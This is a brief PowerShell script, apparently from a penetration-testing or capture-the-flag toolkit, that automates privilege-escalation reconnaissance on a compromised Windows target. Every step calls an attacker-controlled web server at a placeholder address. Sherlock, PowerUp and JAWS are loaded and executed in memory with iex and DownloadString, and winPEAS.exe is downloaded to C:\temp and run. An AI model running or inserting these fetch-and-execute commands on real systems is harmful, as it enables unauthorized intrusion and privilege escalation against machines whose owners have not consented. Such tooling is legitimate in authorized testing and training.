# Powershell script to perform auto recon & enum & privesc check on target


$ip_addr        = "<<LOCAL_IP_ADDRESS>>"  # will be replaced
$webserver_port = 8000

# run enumeration scripts


# sherlock
iex(New-Object System.Net.WebClient).DownloadString("http://${ip_addr}:${webserver_port}/Sherlock.ps1");
try { Find-AllVulns }
catch {}

# powerup
iex(New-Object System.Net.WebClient).DownloadString("http://${ip_addr}:${webserver_port}/PowerUp.ps1");
try { Invoke-AllChecks } catch {}

# jaws
try {    
    iex(New-Object System.Net.WebClient).DownloadString("http://${ip_addr}:${webserver_port}/jaws-enum.ps1") #> jaws.scan.txt    
} catch {}

# winPEAS
(new-object System.Net.WebClient).DownloadFile("http://${ip_addr}:${webserver_port}/winPEAS.exe", 'C:\temp\winpeas.exe')
C:\\temp\\winpeas.exe


# find .bat + .ps1 + hidden
#TODO
